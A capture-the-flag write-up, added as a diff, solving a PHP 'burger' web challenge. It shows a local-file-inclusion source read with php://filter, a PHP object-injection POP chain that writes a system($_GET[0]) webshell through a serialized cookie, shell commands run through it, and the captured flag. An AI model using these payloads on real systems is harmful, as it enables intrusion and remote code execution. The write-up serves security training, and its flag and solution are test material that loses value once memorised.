@@ -1,0 +1,94 @@
+During our exploration, we noticed that the URLs for accessing different pages hint at a Local File Inclusion (LFI) vulnerability. By conducting tests, we confirmed our suspicion
+
+$ curl -s "http://__URL__/?page=php://filter/convert.base64-encode/resource=home"
+
+This command returned a base64-encoded content of the home.php page. Similarly, we extracted and decoded the index.php file to analyze its PHP code
+
+$ curl -s "http://__URL__/?page=php://filter/convert.base64-encode/resource=index" | sed -n '/<body>/,/<p/p' | sed '1d;$d' | xargs | base64 -d
+
+The PHP code revealed several functionalities:
+
+    Displaying pages based on the $_GET["page"] parameter.
+    Building a burger and saving it as a cookie.
+    Ordering the burger.
+
+Notably, the code serialized a base64 object into a cookie when building a burger. This object contained information about the burger's name, buyer's name, and ingredients list.
+
+Further investigation showed that upon ordering the burger, the PHP code deserialized this cookie, potentially opening doors to a PHP Object Injection (POI) attack, particularly a PHP Pop Chain.
+
+Here's a summary of the vulnerable methods:
+
+    Burger::__wakeup(): Executed upon deserialization, potentially leading to code execution.
+    Sauce::__toString(): Automatically called when an object is treated as a string, offering an opportunity for arbitrary code execution.
+
+By exploiting these methods, we could potentially write a file (such as a webshell) on the system. Specifically, we aimed to reach the file_put_contents function in the Sauce class.
+
+To achieve this, we crafted a payload by creating a malicious Sauce object and linking it to a Burger object. When the __wakeup() method executed, it triggered the __toString() method of the Sauce object, thus executing our payload.
+
+use this payload:
+
+<?php
+
+namespace BigFatBurger {
+    class Burger {
+        public $name;
+        public $buyerName;
+
+        public function __construct($name, $buyerName) {
+            $this->name = $name;
+            $this->buyerName = $buyerName;
+        }
+    }
+}
+
+namespace SauceTooSpicy {
+    class Sauce {
+        public $name;
+        public $spiciness;
+
+        function __construct($name, $spiciness) {
+            $this->name = $name;
+            $this->spiciness = $spiciness;
+        }
+    }
+}
+
+namespace {
+    # Create "Sauce" object
+    $s = new \SauceTooSpicy\Sauce('<?php system($_GET[0]); ?>', 'php');
+
+    # Create "Burger" object linked to a "Sauce" object
+    $b = new \BigFatBurger\Burger($s, 'blabla');
+
+    echo base64_encode(serialize($b));
+}
+
+
+Setting the cookie to the generated value and accessing the order page should execute our payload, thus creating our webshell accessible from the application root.
+
+$ curl -s "http://__URL__//index.php?page=order" -H "Cookie: burger=TzoxOToiQmlnRmF0QnVyZ2VyXEJ1cmdlciI6Mjp7czo0OiJuYW1lIjtPOjE5OiJTYXVjZVRvb1NwaWN5XFNhdWNlIjoyOntzOjQ6Im5hbWUiO3M6MjY6Ijw/cGhwIHN5c3RlbSgkX0dFVFswXSk7ID8+IjtzOjk6InNwaWNpbmVzcyI7czozOiJwaHAiO31zOjk6ImJ1eWVyTmFtZSI7czo2OiJibGFibGEiO30="
+
+Accessing our webshell:
+
+curl "http://__URL__/sauce.out.php?0=id;ls+-la"  
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+total 68
+drwxrwxrwx 1 www-data www-data 4096 Apr 25 21:13 .
+drwxr-xr-x 1 root     root     4096 Nov 15  2022 ..
+-rw-rw-r-- 1 www-data www-data   29 Apr 11 19:21 .htaccess
+-rw-rw-r-- 1 www-data www-data 3053 Apr 25 20:18 build.php
+drwxrwxr-x 1 www-data www-data 4096 Mar 20 22:38 classes
+drwxrwxr-x 1 www-data www-data 4096 Mar 20 21:43 css
+drwxrwxr-x 1 www-data www-data 4096 Mar 20 18:10 fonts
+-rw-rw-r-- 1 www-data www-data 1156 Apr 11 19:44 home.php
+drwxrwxr-x 1 www-data www-data 4096 Mar 20 18:10 images
+-rw-rw-r-- 1 www-data www-data 1892 Apr 11 20:34 index.php
+-rw-rw-r-- 1 www-data www-data 1590 Apr 11 20:16 order.php
+-rw-r--r-- 1 www-data www-data   26 Apr 25 21:13 sauce.out.php
+
+The flag is located at the root of the system:
+
+curl "http://__URL__/sauce.out.php?0=cat+/flag"
+
+MCTF{Un53r14L1z3_1n7r0}
